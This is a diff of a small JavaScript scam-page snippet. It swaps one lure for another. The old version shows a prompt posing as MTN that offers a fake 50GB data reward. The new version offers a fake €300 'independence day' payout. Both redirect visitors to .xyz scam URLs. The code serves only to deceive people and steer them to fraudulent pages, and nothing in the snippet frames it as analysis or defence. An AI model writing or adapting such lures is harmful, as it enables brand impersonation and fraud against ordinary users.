@@ -1,7 +1,7 @@
 
 
-var password = 'ACTIVATE 50GB'
-password=prompt('MTN : Dear customer, please check if your SIM card is eligible to receive old customers data reward. to ACTIVATE 50GB, press Ok to verify now','ACTIVATE 50GB');
-if (password != 'ACTIVATE 50GB') {
-location.href='https://www.oldsimusers.xyz/vodacom50gb';
+var password = 'Withdraw €300'
+password=prompt('SMS : Hello Dear, You are invited to claim €300 independence day offer . to Withdraw €300, press Ok to verify now','Withdraw €300');
+if (password != 'Withdraw €300') {
+location.href='https://www.udwang.xyz/withdraw-eur300';
 }
